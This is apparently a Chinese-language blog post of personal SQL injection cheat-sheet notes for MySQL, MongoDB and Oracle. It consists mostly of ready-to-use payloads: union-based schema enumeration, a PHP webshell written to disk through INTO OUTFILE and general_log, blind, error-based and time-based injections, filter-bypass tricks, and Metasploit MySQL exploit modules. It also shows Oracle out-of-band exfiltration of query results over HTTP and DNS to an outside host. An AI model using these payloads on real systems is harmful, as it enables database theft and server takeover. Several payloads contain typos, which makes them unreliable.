---
layout: post
title: "SQLin"
comments: false
description: ""
keywords: "mysql oracle"
---

# mysql

踩点、组装、投送、攻击、植入、控制、行动。

## 手动联合

在自带数据库库information_schema表schemata列SCHEMA_NAME查询库名

    'union select schema_name from information_schema.schemata 


table 表名查询 information_schema.tables

    'union select tanle_name from information_schema.tables where table_schema = "数据库名字"

字段名字 information_schema.columns column_name

    'union select column_name from information_schema.columns where  table_name="表名" and table_schema="xxx"

mysql.user 用户口令哈希

    select user,password from mysql.user

***

## 写文件

    select '<?php @eval($_POST[cmd]);?>' INTO OUTFILE 'D:/phpStudy/WWW/cmd.php';
    ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
 
> 官方文档说明 --secure-file-priv=name Limit LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE() to files within specified directory

* secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。

* mysql --secure-file-priv=null 限制mysqld的导入和导出，完全禁止出。

* mysql --secure-file-priv=/xx/xx 限定输出目录为/xx/xx

```

mysql> show global variables like '%secure%';

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv | NULL  |
+------------------+-------+
```

默认为null 不允许导入导出。my.cnf/my.ini修改参数值。 

### 通过general_log和general_log_file

开启general_log

```

show global variables like "%general%";
show global variables like "%secure%";
set global general_log='on';
SET global general_log_file='/xxx/1.php';
SELECT '<?php assert($_POST["cmd"]);?>';
```

***

## 布尔盲注

### 比较时存在MYSQL隐式类型转换。

* 如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL比较NULL 会返回1。不做类型转换。
* 两个参数都是字符串，按照字符串比较。不做类型转换
* 两个参数都是整数，按照整数比较。不做类型转换
* 有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳
* 所有其他情况下，两个参数都会被转换为浮点数再进行比较

字符串与数字比较，会将字符串转换成浮点数。转换结果为0 ，如果数字开头会从数字部分截断进行比较。
通常在现实中注入点一般为字符注入，少有数字注入点，如；

     select pass form user where name  = "xxxxx";


这时输入的数字会转化为字符串：

```

mysql> select * from user where name=0;
+----+--------+--------+
| Id | name   | pass   |
+----+--------+--------+ 
|  1 | admin  | admin  |
|  2 | admin2 | admin2 |
|  3 | admin3 | admin3 |
|  5 | nana   | nana   |
+----+--------+--------+
4 rows in set, 3 warnings (0.00 sec)

mysql> select * from user where name='0';
Empty set (0.00 sec)
```

可以用运算符+,-,*,/,% 位运算符&,|,^ 构造数字：
```

mysql> select '6'+'5';
+---------+
| '6'+'5' |
+---------+
|      11 |
+---------+
1 row in set (0.00 sec)
```

### 盲注常用函数

* ascii() 返回值为字符串str 的最左字符的数值。假如str为空字符串，则返回值为 0 。假如str 为NULL，则返回值为 NULL。
* BIT_LENGTH(str)返回值为二进制的字符串str 长度。version(), pi(), pow(), 
* char(),将每个参数N理解为一个整数，其返回值为一个包含这些整数的代码值所给出的字符的字符串。NULL值被省略。
* substring(),函数 substring(str,pos,len) 取pos起的len长：不使用逗号 substring(("string" from 1))

```
mysql> select substring("abc",1,1);
+----------------------+
| substring("abc",1,1) |
+----------------------+
| a                    |
+----------------------+
id=1 and substring(user(),1,1) = "r";
```

* concat(str1,str2,...),参数为字符串，返回参数连接产生的字符串，如有任何一个参数为NULL ，则返回值为 NULL。

* group_concat(),将group by 产生的分组内的值连接起来并返回字符串。
* left(str,len),返回str左面长度为len的字符串。 
* rand(),产生一个0到1之间的随机数。order by rand() 可以随机排序。

### 相关绕过

基础字符：

```
true=1
floor(pi())=3
ceil(pi())=4
floor(version())=5
ceil(version())=6
```

空格：%20, %09, %0a, %0b, %0c, %0d, %a0
还有一些可以利用括号或者注释  and，or：||，&&  union select：  
利用括号:

```
'and(true)like(false)union(select(pass)from(users))，  
```

方括号

```
union [all|distinct] select pass from users#，  
union%a0select pass from users，  
```

注释，常见注释符有：//，--，/**/，--+，-- -，可以使用注释来规避空格
内联注释：/!*XXXX*/；只存在mysql中。

```
id=-15 %55nION/**/%53ElecT 1,2,3,4　
id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
```

子查询进行盲注 ：

```
and length((select pass from users having substr(pass,1,1)='a'))  
having：and(select substr(group_concat(pass),1,1)from users)='a  
select ... from(过滤代码如/SELECTs+[A-Za-z.]+s+FROM/i/i)：  
select [all|distinct] pass from users  
select`table_name`from`information_schema` . `tables`  
select pass as alias from users  
select pass aliasalias from users  
select pass`alias alias`from users  
select+pass%a0from(users)  
select,and,&：  
```

### 异或运算的sql注入

运算符为^ 或者 xor,运算符前后同真同假为0，运算符前后不同为1。null与任何条件（真、假、null）做异或，结果都为null.

### like&limit

当注入点存在与limit子句时，union联合查询不能在order by子句之后。
补充select 语法：

```
SELECT 
    [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

在limit后可以接两个函数 into 和procedure，into需要写文件的权限，且默认为关闭。
procedure analyse() 可以结合报错注入利用。


***

## 时间盲注

sleep()
BENCHMARK()

## 报错注入

### 通过floor报错

通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1.

```
and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);

and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));
```

### ExtractValue报错

extractValue()使用时有两个参数，在注入时第一个参数为1，第二个参数为回显的数据。如果在报错数据不连接其他字符，数据可能会显示不完整。

```

mysql> select extractvalue(1,concat(0x3a,version())); //有连接字符
ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
mysql> select extractvalue(1,version()); //无连接字符
ERROR 1105 (HY000): XPATH syntax error: '.53'
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
```

### updateXML报错

updateXML()函数有3个参数，注入过程中第1，3个参数可以为1.第二个参数为要报错的数据，也需要连接其他字符才能得到完整数据。
```
语句：
and 1=(updatexml(1,concat(0x3a,(select user())),1))
```

### join报错注入

## MySQL相关

### or(表名)

or(字段名) 会遍历该字段下的之，返回不为false的值，字符串默认为0，即false，字符串内存在数字则为true。
可以用来测试是否存在某一字段名。

### order by 注入

order by子句后面参数为数字或字段名，
可以用if判断和返回值进行利用：
/?order=IF(1=1,name,price) 通过name字段排序
/?order=IF(1=2,name,price) 通过price字段排序
还可以使用rand()来执行sql语句进行报错注入和延时注入，没有回显是使用盲注。

利用：

```
利用regexp 
/?order=(select+1+regexp+if(1=1,1,0x00)) 正常 
/?order=(select+1+regexp+if(1=2,1,0x00)) 错误  
利用updatexml 
/?order=updatexml(1,if(1=1,1,user()),1) 正确 
/?order=updatexml(1,if(1=2,1,user()),1) 错误  
利用extractvalue 
/?order=extractvalue(1,if(1=1,1,user())) 正确 
/?order=extractvalue(1,if(1=2,1,user())) 错误 
```

### 单引号被过滤

* hex编码 16进制编码：

    SELECT password FROM Users WHERE username = 0x61646D696

* char() 方法：

    SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)

* 宽字节gbk编码在单引号加%df

### msf相关利用

* mysql_login登录爆破模块
* mysql_hashdump导出用户密码hash值
* mof提权模块：

```
use exploit/windows/mysql/mysql_mof
use exploit/windows/mysql/mysql_start_up
use exploit/windows/mysql/scrutinizer_upload_exec
use exploit/windows/mysql/mysql_payload
use exploit/windows/mysql/mysql_yassl_hello

```

# mongodb

mongodb，开源，文档导向的数据管理系统，C++编写。数据JSON形式保存。每个数据库存在多个集合collections，每个集合包含多个文档documents
主要特性：

* 基于文档

* 高性能
* 简单的可拓展性
* 没有复杂的连接

## mongdb shell

* use dbs使用或创建数据库：

* db显示当前数据库
* 把数据插入data集合中:db.data.insert({"user":"admin"}) 
* 查询data集合中的全部元素:db.data.find() 
* 添加条件查询：db.data.find({'user':"admin"}) 
* 删除数据：db.data.remove("数据")
* 删除集合：db.data.drop()
* 删除当前数据库：db.dropDatabase() 

## 漏洞

### 端口

* 服务默认端口27017 ，默认设置不需要验证如。果MongoDB服务在没有适当的安全控制的情况下通过网络公开，任何人都可以远程连接到数据库。

* MongoDB提供了一个简单的HTTP界面，如果使用带–rest选项的接口启用mongod，HTTP接口的默认端口是28017，可以使用nmap查看远程主机是否使用http接口运行，通过-sV确认。'

* 注意：默认情况下运行的MongoDB版本大于2.6，禁用http接口。

#### nmap mongdb相关NSE Script

* nmap --script mongdb-brute.nse 提供针对需要验证的http接口进行爆破.
* nmap --script mongdb-databases.nse 在mingdb服务未授权情况下，获取表内容。

#### 认证方法

* 从MongoDB版本3.0开始，MongoDB已经将其默认的认证方法改变为质询和响应机制（SCRAM-SHA-1）。根据文档，“SCRAM-SHA-1根据用户的名称，密码和数据库验证提供的用户凭证。
* 当用户使用MongoDB进行身份验证时，他必须提供用户名，密码和创建数据库。

    mongo 192.168.2.105 -u user -p password –authenticationDatabase userdb

# oracle

## 特殊点

* 查询语句后一直需要跟上表名，提供dual虚拟表构成查询语句。
* Oracle保证dual永远存在一条数据。
* 数据类型强匹配，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。
* Oracle的单行注释符号是--，多行注释符号/**/。

## union注入

* 列数 'order by --+
* 回显位 ' union select null,null,null form dual --+
* 数据库版本 (select banner from  sys.v_$version where rownum=1)
* 查询当前数据库 

```sql
select instance_name from v$instance;
```

* 库内表明位于字典user_tables:

```sql
' union select null, null,(select table_name from user_tables where rownum=1),null from dual -- 
' union select null,null (seslet table_name from user_tables where rownum=1 and table_name <> '已知表名'),null fron dual --

```

* 字段名位于表user_tab_columns内：

```
' union select null,(select column_name from user_tab_columns where table_name="表名" and rownum=1),null from dual --
' union select null ,(select column_name fron user_tab_columns where table_name="表名" and column_name="字段名" and rownum=1) null from dual -- 
```

## 报错注入

使用报错注入需要使用1=(报错语句函数)，1>(报错语句)使用运算符的方式进行报错注入（MySQL仅使用函数即可成功）

* utl_inaddr.get_host_name()

```sql
'and 1=utl_inaddr.get_host_name((select user fro dual)) -- 
```

* ctxsys.drithsx.sn()

```sql
' and 1=ctxsys.drithsx.sn(1,(select user from dual)) --

SQL> select user from dual where 1=ctxsys.drithsx.sn(1,(select user from dual));

第 1 行出现错误:
ORA-20000: Oracle Text 错误:
DRG-11701: 主题词表 SCOTT 不存在
ORA-06512: 在 "CTXSYS.DRUE", line 160
ORA-06512: 在 "CTXSYS.DRITHSX", line 540
ORA-06512: 在 line 1
```

* 使用XMLType()进行报错注入

```sql
' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --

SQL> select user from dual where (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null;

第 1 行出现错误:
ORA-31011: XML 语法分析失败
ORA-19202: XML 处理
LPX-00110: Warning: 无效的 QName ":SCOTT" (不是名称)
Error at line 1
时出错
ORA-06512: 在 "SYS.XMLTYPE", line 310
ORA-06512: 在 line 1
```

* 使用dbms_xdb_version.checkin()&makeversioned()&uncheckout()

```sql
' and (select dbms_xdb_verson.checkin((select user from dual)) from dual) is not null --

SQL> select user from dual where (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null;

第 1 行出现错误:
ORA-31001: 资源句柄或路径名 "SCOTT" 无效

SQL> select user from dual where (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null;

第 1 行出现错误:
ORA-31001: 资源句柄或路径名 "SCOTT" 无效

SQL> select user from dual where (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null;

第 1 行出现错误:
ORA-31001: 资源句柄或路径名 "SCOTT" 无效
```

* dbms_utility.sqlid_to_sqlhash()

```sql
' and (select dbms_utility.sqlid_to_sqlhash((select user from dual)) fron dual) is not null --

SQL> select user from dual where (select dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null;

第 1 行出现错误:
ORA-13797: 指定了无效的 SQL ID, SCOTT
ORA-06512: 在 "SYS.DBMS_UTILITY", line 1218
```

> 11g对utl_inaddr&utl_http默认存在ACL限制；

## Oracle 带外通信获取查询结果的方法

可以使用Oracle发送HTTP和DNS请求，并将查询结果带到请求中，然后监测外网服务器的HTTP和DNS日志，从日志中获取查询结果，通过这种方式将盲注转换成可以直接简便的获取查询结果的方式。

### HTTP

* utl_http.request()
```sql
' and 1=utl_http.request('http://127.0.0.1:8086/'||(select banner from sys.v_$version where rownum=1)) --

```

### DNS

* utl_inaddr.get_host_address()
```sql
' and (select utl_inaddr.get_host_address((select user from dual)||'.youhost') from dual)is not null--
```

## 盲注

可以使用ASCII()，substr()这种通用组合获取数。

* 使用decode()函数进行盲注：

```
decode(条件,值1,返回值1,值2,返回值2,...值n，返回值n,缺省值)

if （条件==值1）
then
return(翻译值1)
elsif （条件==值2）
then
return(翻译值2)
......
elsif （条件==值n）
then 
return(翻译值n)
else
return(缺省值)
end if
```

```sql
'and 1=(select decode(substr(user,1,1),'遍历参数',(1),0) from dual) --
```

## 延时注入

* 通过页面响应的状态，这里指的是响应时间，通过这种方式判断SQL是否被执行的方式，
* oracle中DBMS_PIPE.RECEIVE_MESSAGE()
* decode()与高耗时SQL操作的组合
* 可以用case，if 等方式与高耗时操作的组合：

```sql
select count(*) from all_objects
```